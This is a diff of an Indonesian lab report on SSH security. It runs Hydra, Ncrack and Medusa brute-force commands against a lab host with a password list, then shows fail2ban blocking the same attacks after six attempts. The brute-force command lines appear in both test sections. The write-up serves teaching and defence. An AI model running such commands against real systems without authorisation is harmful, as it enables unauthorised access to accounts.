@@ -116,24 +116,28 @@ Dikarenakan kita sudah menginstall SSH Server diawal maka kita tidak perlu melak
 ## Langkah Uji Penetrasi dengan SSH Brute Force Tools
 
 Kita tidak perlu untuk menginstall tools untuk penetrasi, karena di Kali Linux tools tersebut semuanya sudah lengkap terinstall.
-Sebelum kita memulai ujicoba, siapkan terlebih dahulu kumpulan list kemungkinan password. Disini kami meletakkan kumpulan password tersebut pada file **passlist.txt**. Untuk skenario ujicoba, kami akan mencoba melakukan brute force attack ke komputer **hendri** dengan alamat ip **10.151.32.4**.
+Sebelum kita memulai ujicoba, siapkan terlebih dahulu kumpulan list kemungkinan password. **Ingat** didalam kumpulan password tersebut harus berisi **password asli** dari komputer tujuan. Disini kami meletakkan kumpulan password tersebut pada file **passlist.txt**. Untuk skenario ujicoba, kami akan mencoba melakukan brute force attack ke komputer **hendri** dengan alamat ip **10.151.32.4**.
 
 **Uji Penetrasi 1**
 
 Hydra
-- Buka Applikasi Hydra
+- Buka Aplikasi Hydra
 - Syntax penggunaan : `hydra -l username -P ListofPassword ssh://iptujuan`
 - Maka perintah yang dimasukkan : `hydra -l hendri -P passlist.txt ssh://10.151.32.4` 
 
 Ncrack
-- Buka Applikasi Ncrack
-- Syntax penggunaan : `ncrack -v --user username -P ListofPassword ssh://iptujuan`
-- Maka perintah yang dimasukkan : `ncrack -v --user hendri -P passlist.txt ssh://10.151.32.4` 
+- Buka Aplikasi Ncrack
+- Syntax penggunaan : `ncrack -u username -P ListofPassword ssh://iptujuan`
+- Maka perintah yang dimasukkan : `ncrack -u hendri -P passlist.txt ssh://10.151.32.4` 
 
 Medusa
-- Buka Applikasi Ncrack
+- Buka Aplikasi Ncrack
 - Syntax penggunaan : `medusa -u username -P ListofPassword -h iptujuan -M ssh`
 - Maka perintah yang dimasukkan : `medusa -u hendri -P passlist.txt -h 10.151.32.4 -M ssh`
+
+**Hasil Uji Penetrasi 1**
+- Ketiga aplikasi tersebut berhasil dalam melakukan brute force attack dengan mencoba semua kemungkinan password yang ada.
+- Dari ketiga aplikasi tersebut, **Hydra** paling cepat dalam menemukan hasil pencarian kemudian disusul oleh **Ncrack** dan terakhir **Medusa**
 
 **Uji Penetrasi 2**
 
@@ -145,16 +149,25 @@ Install terlebih dahulu **file2ban** pada Ubuntu Server
 Konfigurasi fail2ban
 - Atur konfigurasi di /etc/fail2ban/jail.conf
 - Tambahkan beberapa baris dibawah berikut :
-```> enable = true
-> port = ssh
-> filter = sshd
-> logpath = /var/log/auth.log
-> maxretry = 6
-> bantime = 120
+``` enable = true
+ 	port = ssh
+ 	filter = sshd
+ 	logpath = /var/log/auth.log
+ 	maxretry = 6
+ 	bantime = 120
 ```
+- Jalankan fail2ban dengan memasukkan perantah `sudo service fail2ban start` pada terminal
 
 Hydra
+- Masukkan perintah : `hydra -l hendri -P passlist.txt ssh://10.151.32.4` 
 
 Ncrack
+- Masukkan perintah : `ncrack -u hendri -P passlist.txt ssh://10.151.32.4` 
 
 Medusa
+- Masukkan perintah : `medusa -u hendri -P passlist.txt -h 10.151.32.4 -M ssh`
+
+**Hasil Uji Penetrasi 2**
+- Ketiga aplikasi tersebut tidak pada saat melakukan percobaan ke tujuh karena mengalami connection refuse sehingga, gagal dalam melakukan brute force attack
+- Setelah melakukan percobaan 6 kali dan gagal, maka otomatis server akan **mem-banned** ip yang berusaha untuk mengakses server tersebut selama 2 menit
+- Hasil percobaan untuk melakukan brute force attack dapat dilihat di `**/var/log/auth.log**`
